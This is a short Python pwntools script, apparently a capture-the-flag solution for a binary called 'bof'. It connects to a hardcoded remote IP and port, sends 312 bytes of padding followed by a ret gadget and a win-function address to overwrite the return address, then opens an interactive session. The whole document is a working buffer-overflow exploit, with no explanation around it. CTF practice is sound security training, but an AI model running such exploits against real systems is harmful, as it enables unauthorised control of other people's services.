from pwn import *

r = remote("34.89.213.64", 30383)
#r = process("./bof")

win_func = 0x400767
ret_gadget = 0x4007f6

payload = b""
payload += b"A" * 312
payload += p64(ret_gadget)
payload += p64(win_func)

r.sendline(payload)
r.interactive()